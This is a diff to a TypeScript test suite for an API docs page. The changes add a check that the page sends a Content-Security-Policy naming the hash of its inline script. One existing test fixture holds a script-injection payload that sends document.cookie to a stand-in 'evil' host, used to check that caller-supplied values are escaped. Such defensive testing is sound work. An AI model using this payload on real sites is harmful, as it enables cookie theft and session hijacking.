@@ -15,6 +15,7 @@
 // one present, an injected value escaped beside a legitimate one still rendered.
 
 import { describe, it, expect, beforeAll, afterAll } from 'bun:test'
+import { createHash } from 'node:crypto'
 import { createApp, createService, defaultConfig } from '../index.ts'
 import { openapi } from '../src/plugins/openapi/index.ts'
 
@@ -171,6 +172,7 @@ describe('a declared input reaches the spec', () => {
 describe('the docs page interpolates two caller-supplied values', () => {
 
   let html: string
+  let csp:  string
 
   beforeAll(async () => {
     const ui = createApp({ config: { port: PORT + 2 } })
@@ -182,7 +184,9 @@ describe('the docs page interpolates two caller-supplied values', () => {
       scalar:  { customCss: '</script><script>fetch("//evil/"+document.cookie)</script>' },
     }))
     await ui.start()
-    html = await (await fetch(`http://localhost:${PORT + 2}/docs`)).text()
+    const res = await fetch(`http://localhost:${PORT + 2}/docs`)
+    html = await res.text()
+    csp  = res.headers.get('content-security-policy') ?? ''
     await ui.stop()
   })
 
@@ -204,5 +208,15 @@ describe('the docs page interpolates two caller-supplied values', () => {
     // API's own origin.
     const src = html.match(/<script src="([^"]+)"/)?.[1] ?? ''
     expect(src).toMatch(/@scalar\/api-reference@\d+\.\d+\.\d+$/)
+  })
+
+  // The app's default CSP refuses both scripts, so the page states its own;
+  // a hash that drifts from the inline body blanks the page in a browser only
+  it('the page states its own CSP, naming the inline script by its hash', () => {
+    const body = html.match(/<script>([\s\S]*?)<\/script>/)?.[1] ?? ''
+    const hash = createHash('sha256').update(body, 'utf8').digest('base64')
+    expect(csp).toContain(`'sha256-${hash}'`)
+    expect(csp).toContain('https://cdn.jsdelivr.net')
+    expect(csp).toContain("default-src 'self'")
   })
 })
